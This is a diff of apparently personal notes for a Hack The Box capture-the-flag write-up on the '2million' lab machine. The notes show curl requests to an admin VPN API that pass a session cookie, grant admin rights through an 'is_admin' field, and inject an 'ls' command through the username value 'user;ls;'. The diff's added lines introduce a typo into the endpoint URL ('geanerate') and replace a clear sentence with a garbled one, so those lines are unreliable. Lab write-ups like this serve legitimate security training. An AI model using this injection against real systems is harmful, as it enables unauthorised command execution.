@@ -162,13 +162,13 @@ curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -vX POST http://2million.ht
 ![[Pasted image 20230903231455.png]]
 
 ```bash
-curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -vX POST http://2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" -d '{"email":"user@hackthebox.htb", "is_admin":1, "username":"user"}' 
+curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -vX POST http://2million.htb/api/v1/admin/vpn/geanerate -H "Content-Type: application/json" -d '{"email":"user@hackthebox.htb", "is_admin":1, "username":"user"}' 
 ```
 
 - Our VPN cert has been generated!
 ![[Pasted image 20230903232814.png]]
 
-- Because these parameter values are being validated, there's a chance for command injection. 
+- These parameter values are going through some type of validation/verification. There's a what mechanism is in place is not checking for dangerous characters. 
 - Append ;ls; to the end of the username and see what we get
 ``` bash
 curl --cookie "PHPSESSID=jgfva48frp29fvdlt5ns0q3lmh" -vX POST http://2million.htb/api/v1/admin/vpn/generate -H "Content-Type: application/json" -d '{"email":"user@hackthebox.htb", "is_admin":1, "username":"user;ls;"}'
